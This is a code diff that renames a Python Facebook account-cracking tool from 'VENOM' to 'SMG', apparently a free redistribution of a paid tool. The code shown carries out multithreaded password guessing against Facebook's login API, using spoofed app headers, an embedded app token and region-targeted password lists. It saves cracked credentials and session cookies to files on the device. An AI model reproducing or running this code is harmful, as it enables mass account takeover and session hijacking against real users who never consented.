@@ -94,7 +94,7 @@ def p(x):
 
 xxxx="[FBAN/"+"FB4A;FBAV/"+"61.0.0.15.69;FBBV/"+"20748125;FBDM/"+"{density=1.0,width=600,height=976};FBLC/"+"es_LA;FBCR/"+"MOVISTAR;FBMF/"+"Rockchip;FBBD/"+"K5-3G;FBPN/"+"com.facebook.katana;FBDV/"+"K5-3G;FBSV/"+"5.1.1;nullFBCA/"+"x86:armeabi-v7a;]"
 #ua = "[FBAN/FB4A;FBAV/107.26.45.69;FBBV/61714298;FBDM/{density=2.5,width=859,height=2059};FBLC/en_GB;FBRV/11130038;FBCR/GLOBE;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI;FBSV/5.8;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/135.62.83.5;FBBV/51324647;FBDM/{density=1.1,width=832,height=2554};FBLC/en_GB;FBRV/24264444;FBCR/GLOBE;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI;FBSV/9.7;FBOP/1;FBCA/arm64-v8a:;]"
-folder_path = '/sdcard/VENOM'
+folder_path = '/sdcard/SMG'
 try:
     os.makedirs(folder_path, exist_ok=True)
 except:
@@ -104,16 +104,25 @@ oks=[]
 cps=[]
 loop=0
 logo=(f"""\033[1;37m
- db    db d88888b d8b   db  .d88b.  .88b  d88. 
- 88    88 88'     888o  88 .8P  Y8. 88'YbdP`88 
-\033[1;32m Y8    8P 88ooooo 88V8o 88 88    88 88  88  88 
-\033[1;32m `8b  d8' 88~~~~~ 88 V8o88 88    88 88  88  88 
-\033[1;37m  `8bd8'  88.     88  V888 `8b  d8' 88  88  88 
-    YP    Y88888P VP   V8P  `Y88P'  YP  YP  YP  
+ 
+\033[1;32m  
+  ______   __       __   ______  
+ /      \ |  \     /  \ /      \ 
+|  $$$$$$\| $$\   /  $$|  $$$$$$\
+| $$___\$$| $$$\ /  $$$| $$ __\$$
+ \$$    \ | $$$$\  $$$$| $$|    \
+ _\$$$$$$\| $$\$$ $$ $$| $$ \$$$$
+|  \__| $$| $$ \$$$| $$| $$__| $$
+ \$$    $$| $$  \$ | $$ \$$    $$
+  \$$$$$$  \$$      \$$  \$$$$$$ 
+                
+\033[1;32m 
+\033[1;37m 
+
 ════════════════════════════════════════════════
 \033[1;32m  • \033[1;37m Tool Owner :-  Usman X Kazama
 \033[1;32m  • \033[1;37m GitHub     :-  VENOM-786
-\033[1;32m  • \033[1;37m Type       :-  Paid
+\033[1;32m  • \033[1;37m Type       :-  free
 \033[1;32m  • \033[1;37m Version    :-  {version}""")
 os.system('clear')
 #print("\033[1;32m [•]\033[1;37m Join My FaceBook Group...! \033[1;32mThnx");time.sleep(2);os.system('xdg-open https://facebook.com/groups/1245912839659325/')
@@ -159,14 +168,14 @@ def Main_VENOM():
             if d == '1':os.system('xdg-open https://api.whatsapp.com/send?phone=+994409879304/');Main_VENOM()
             if d == '2':os.system('xdg-open https://www.facebook.com/usman.rajpoot.1100');Main_VENOM()
  
-            if d == '0':Main_VENOM()
+            if d == '0':Main_SMG()
             else:line();print('\033[1;33m [•]\033[1;31m Selected Wrong Option ');time.sleep(2);Main_VENOM()
         elif opt1 == "3":
             clear();print(' [\033[1;32m1\033[97;1m] Join WhatsApp Group');print(' [\033[1;32m2\033[97;1m] Join Facebook Group');print(' [\033[1;32m0\033[97;1m] \033[1;31mBack Main Menu');line()
             d=input(' [•] Choose : ')
             if d == '1':os.system('xdg-open https://chat.whatsapp.com/HEhfeaajh1IITDiVpyJI7z');Main_VENOM()
             if d == '2':os.system('xdg-open https://facebook.com/groups/1245912839659325/');Main_VENOM()
-            if d == '0':Main_VENOM()
+            if d == '0':Main_SMG()
             else:line();print('\033[1;33m [•]\033[1;31m Selected Wrong Option ');time.sleep(2);Main_VENOM()
  
         elif opt1 == "0":line();print('[•] Thanks For Use\n[•] See You Again ');exit()
@@ -197,7 +206,7 @@ def method():
     print(f'\033[1;32m [✓] \033[1;37mYour Choosed Password Limits : \033[1;32m',ps_limit);line();print(f'\033[1;32m [•] \033[1;37mEXAMPLE : first last,firtslast,first123');line()
     for i in range(ps_limit):
         plist.append(input(f" \033[1;32m[?]\033[1;37m Put Password\033[1;32m [\033[1;37m%s\033[1;32m]\033[1;37m : "%(i+1)))
-    with tred(max_workers=30) as VENOM:
+    with tred(max_workers=30) as SMG:
         clear()
         tl = str(len(fo))
         
@@ -205,18 +214,18 @@ def method():
         print(f'\033[1;32m (√) \033[1;37mTotal IDs  :\033[1;32m ',tl)
         #p('\033[1;32m [√] \033[1;37mMethod \033[1;32m>\033[1;37m M{mthd}')
  
-        print("\x1b[38;5;208m (!) \033[1;37mUse Flight Mode For Speed UP");print('\033[1;33m [•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/VENOM');line()
+        print("\x1b[38;5;208m (!) \033[1;37mUse Flight Mode For Speed UP");print('\033[1;33m [•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/SMG');line()
         #line()
         for user in fo:
             ids,names = user.split('|')
             passlist = plist
             if methd =='1':
-                VENOM.submit(api1,ids,names,passlist)
+                SMG.submit(api1,ids,names,passlist)
             #elif methd =='2':
                 #VENOM.submit(api1,ids,names,passlist)
                # line();print('\033[1;32m [!] \033[1;31mComing Soon...!');exit()
             else:
-                VENOM.submit(api1,ids,names,passlist)
+                SMG.submit(api1,ids,names,passlist)
  
                 
     line()
@@ -226,7 +235,7 @@ def method():
     line()
  
     input("\033[1;32m [•]\033[1;33m Press Enter To Go Back ")
-    os.system('python VENOM.py')
+    os.system('python SMG.py')
 
 ###########______###########
 
@@ -256,8 +265,8 @@ def pak():
                                 ids = code+psx
                                 passlist = [psx,ids,'khankhan123','57273200','khankhan','786786','khan123','khan12345','khan123456','khanbaba','khan786','khankhan12345','malik123','malik12345','khanzada','kingkhan','khan1234','alikhan','pak123','ali123','ali12345','ali786','ali123456','jan jan','baloch','baloch123','khan1122','khan12','i love you','iloveyou','janjan']
  
-                                VENOM.submit(rd1,ids,passlist)
-                print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python VENOM.py')
+                                SMG.submit(rd1,ids,passlist)
+                print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/SMG/SMG-R-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python VENOM.py')
 
 def afg():
                 user=[]
@@ -277,7 +286,7 @@ def afg():
    
                 #clear();cp=input('\033[1;32m [?] \033[1;33m Show Cp Account \033[1;32m(y/n) : \033[1;37m')
                  
-                with tred(max_workers=30) as VENOM:     
+                with tred(max_workers=30) as SMG:     
                         clear()
                         tl = str(len(user))
                         print('\033[1;32m (√) \033[1;37mTotal IDs   :\033[1;32m '+tl);print('\033[1;32m (√) \033[1;37mChose Code  : %s'%(code));print("\x1b[38;5;208m (!) \033[1;37mUse Flight Mode For Speed UP");print('\033[1;33m [•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/VENOM');line()
@@ -285,8 +294,8 @@ def afg():
  
                                 ids = code+psx
                                 passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
-                                VENOM.submit(rd1,ids,passlist)
-                print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python VENOM.py')
+                                SMG.submit(rd1,ids,passlist)
+                print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/SMG/SMG-R-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python VENOM.py')
 
 def bd():
                 user=[]
@@ -306,15 +315,15 @@ def bd():
    
                 #clear();cp=input('\033[1;32m [?] \033[1;33m Show Cp Account \033[1;32m(y/n) : \033[1;37m')
                  
-                with tred(max_workers=30) as VENOM:     
+                with tred(max_workers=30) as SMG:     
                         clear()
                         tl = str(len(user))
-                        print('\033[1;32m (√) \033[1;37mTotal IDs   :\033[1;32m '+tl);print('\033[1;32m (√) \033[1;37mChose Code  : %s'%(code));print("\x1b[38;5;208m (!) \033[1;37mUse Flight Mode For Speed UP");print('\033[1;33m [•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/VENOM');line()
+                        print('\033[1;32m (√) \033[1;37mTotal IDs   :\033[1;32m '+tl);print('\033[1;32m (√) \033[1;37mChose Code  : %s'%(code));print("\x1b[38;5;208m (!) \033[1;37mUse Flight Mode For Speed UP");print('\033[1;33m [•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/SMG');line()
                         for psx in user:
                                 ids = code+psx
                                 passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','janjan','free fire','freefire','57273200']
-                                VENOM.submit(rd1,ids,passlist)
-                print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python VENOM.py')
+                                SMG.submit(rd1,ids,passlist)
+                print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/SMG/SMG-R-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/SMG/SMG-R-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python SMG.py')
 
  
 
@@ -348,11 +357,11 @@ def gmail():
                                 mail = ''.join(random.choice(string.digits) for _ in range(4))
                                 open('.gm.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                         fo = open('.gm.txt', 'r').read().splitlines()
-                with tred(max_workers=30) as VENOM:
+                with tred(max_workers=30) as SMG:
                         total = str(len(fo))
  
                         clear()
-                        print('\033[1;32m (√) \033[1;37mTotal IDs   :\033[1;32m '+total);print('\033[1;32m (√) \033[1;37mChosed Gmail  : %s'%(domain));print("\x1b[38;5;208m (!) \033[1;37mUse Flight Mode For Speed UP");print('\033[1;33m [•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/VENOM');line()
+                        print('\033[1;32m (√) \033[1;37mTotal IDs   :\033[1;32m '+total);print('\033[1;32m (√) \033[1;37mChosed Gmail  : %s'%(domain));print("\x1b[38;5;208m (!) \033[1;37mUse Flight Mode For Speed UP");print('\033[1;33m [•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/SMG');line()
                         for user in fo:
                                 ids,names = user.split('|')
                                 first_name = names.rsplit(' ')[0]
@@ -365,8 +374,8 @@ def gmail():
                                 ls = last_name.lower()
                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
  
-                                VENOM.submit(rd1,ids,passlist)
-                print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python VENOM.py')
+                                SMG.submit(rd1,ids,passlist)
+                print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/SMG/SMG-R-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/SMG/SMG-R-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python SMG.py')
 
 
 def rd1(ids,passlist):
@@ -391,7 +400,7 @@ def rd1(ids,passlist):
                 xxx = "[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;"+"FBCR/Telenor;"+"FBMF/Hwawie;"+"FBBD/Opppo;"+"FBPN/com.facebook.katana;"+"FBDV/Samsong 17974;"+"FBSV/5.0;"+"FBOP/1;"+"FBCA/x86:arfuck-v7a;]','[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;"+"FBCR/Telenor;"+"FBMF/relmeo;"+"FBBD/technO;"+"FBPN/com.facebook.orca;"+"FBDV/V2043;"+"FBSV/5.0;"+"FBOP/1;"+"FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;]"
                 #ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/335.0.0.28.118;FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/316527966;FBCR/Bezlimit;FBMF/Xiaomi;FBBD/Redmi;FBDV/Redmi Note 8 Pro;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=2220};FB_FW/1;FBRV/317757053;]"
                 ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.82,width=1605,height=633};FBLC/es_ES;FBRV/'+fbrv+';FBCR/459657077;FBMF/Huawei;FBBD/Apple;FBPN/com.facebook.katana;FBDV/Device-9601;FBSV/'+fbsv+';FBOP/19;FBCA/armeabi-v8a;]"
-                head = {'User-Agent':VENOM_UA(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
+                head = {'User-Agent':SMG_UA(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
                 data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'es_ES','client_country_code':'ES','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                 po = requests.post('https://graph.facebook.com/auth/login', data=data, headers=head).json()
                 if 'session_key' in po:
@@ -399,10 +408,10 @@ def rd1(ids,passlist):
                         ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                         ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                         cookie = f"sb={ssbb};{ckkk}"
-                        print('\r\r\033[1;32m [VENOM-OK] '+uid+' √ '+pas)
+                        print('\r\r\033[1;32m [SMG-OK] '+uid+' √ '+pas)
                         print(f" \033[1;92m[\033[1;97mCOOKIE\033[1;92m] \033[1;97m{cookie}")
-                        file_path_ok = os.path.join(folder_path, 'VENOM-R-OK.txt')
-                        file_path_cookies = os.path.join(folder_path, 'VENOM-R-COOKIE.txt')
+                        file_path_ok = os.path.join(folder_path, 'SMG-R-OK.txt')
+                        file_path_cookies = os.path.join(folder_path, 'SMG-R-COOKIE.txt')
                         with open(file_path_ok, 'a') as file_ok, open(file_path_cookies, 'a') as file_cookies:
                             file_ok.write(uid+' √ '+pas+'\n')
                             file_cookies.write(uid+' √ '+pas+' >>> '+cookie+'\n')
@@ -411,7 +420,7 @@ def rd1(ids,passlist):
                 elif 'www.facebook.com' in po['error']['message']:
                         uid = str(po['error']['error_data']['uid'])
                         #print(f'\r\r\33[1m\33[1;35m [CP] '+uid+' | '+pas+'\033[1;97m')
-                        file_path = os.path.join(folder_path, 'VENOM-R-CP.txt')
+                        file_path = os.path.join(folder_path, 'SMG-R-CP.txt')
                         with open(file_path, 'a') as file:
                             file.write(uid+' √ '+pas+'\n')
                         cps.append(uid)
@@ -427,7 +436,7 @@ def rd1(ids,passlist):
 def api1(ids,names,passlist):
     try:
         global ok,loop,sim_id
-        sys.stdout.write('\r\r\33[1;37m [\33[1;32mVENOM-XD\33[1;37m] %s | \033[1;32mOK:-%s  \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\33[1;37m [\33[1;32mSMG-XD\33[1;37m] %s | \033[1;32mOK:-%s  \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         fn = names.split(' ')[0]
         try:
             ln = names.split(' ')[1]
@@ -451,7 +460,7 @@ def api1(ids,names,passlist):
             network = random.choice(['Zong','Roshan','null','Marshmallow','Telekom China'])
             xxx = "[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;"+"FBCR/Telenor;"+"FBMF/vivo;"+"FBBD/vivo;"+"FBPN/com.facebook.katana;"+"FBDV/vivo 1724;"+"FBSV/5.0;"+"FBOP/1;"+"FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;"+"FBCR/Telenor;"+"FBMF/vivo;"+"FBBD/vivo;"+"FBPN/com.facebook.orca;"+"FBDV/V2043;"+"FBSV/5.0;"+"FBOP/1;"+"FBCA/x86:armeabi-v7a;]','[FBAN/FB4A;"+"FBAV/106.0.0.26.68;"+"FBBV/45904160;"+"FBDM/{density=3.0,width=1080,height=1920};"+"FBLC/en_US;"+"FBRV/45904160;]"
             #ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/335.0.0.28.118;FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/316527966;FBCR/Bezlimit;FBMF/Xiaomi;FBBD/Redmi;FBDV/Redmi Note 8 Pro;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=2220};FB_FW/1;FBRV/317757053;]"
-            head = {'User-Agent':VENOM_UA(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
+            head = {'User-Agent':SMG_UA(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
             data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'es_ES','client_country_code':'ES','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
             po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
             if 'session_key' in po:
@@ -459,11 +468,11 @@ def api1(ids,names,passlist):
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                     ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                     cookie = f"sb={ssbb};{ckkk}"
-                    print('\r\r\033[1;32m [VENOM-OK] '+uid+' √ '+pas)
+                    print('\r\r\033[1;32m [SMG-OK] '+uid+' √ '+pas)
                     print(f" \033[1;92m[\033[1;97mCOOKIE\033[1;92m] \033[1;97m{cookie}")
-                    file_path = os.path.join(folder_path, 'VENOM-FILE-OK.txt')
+                    file_path = os.path.join(folder_path, 'SMG-FILE-OK.txt')
                     #session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
-                    open('/sdcard/VENOM/VENOM-FILE-OK-COOKIE.txt','a').write(uid+' √ '+pas+' >>> '+cookie+'\n')
+                    open('/sdcard/SMG/SMG-FILE-OK-COOKIE.txt','a').write(uid+' √ '+pas+' >>> '+cookie+'\n')
                     with open(file_path, 'a') as file:
                         file.write(uid+' √ '+pas+'\n')
                     oks.append(uid)
@@ -471,7 +480,7 @@ def api1(ids,names,passlist):
             elif 'www.facebook.com' in po['error']['message']:
                     uid = str(po['error']['error_data']['uid'])
                     #print(f'\r\r\33[1m\33[1;35m [MOOSA-CP] '+uid+' | '+pas+'\033[1;97m')
-                    file_path = os.path.join(folder_path, 'VENOM-FILE-CP.txt')
+                    file_path = os.path.join(folder_path, 'SMG-FILE-CP.txt')
                     with open(file_path, 'a') as file:
                         file.write(uid+' √ '+pas+'\n')
                     cps.append(uid)
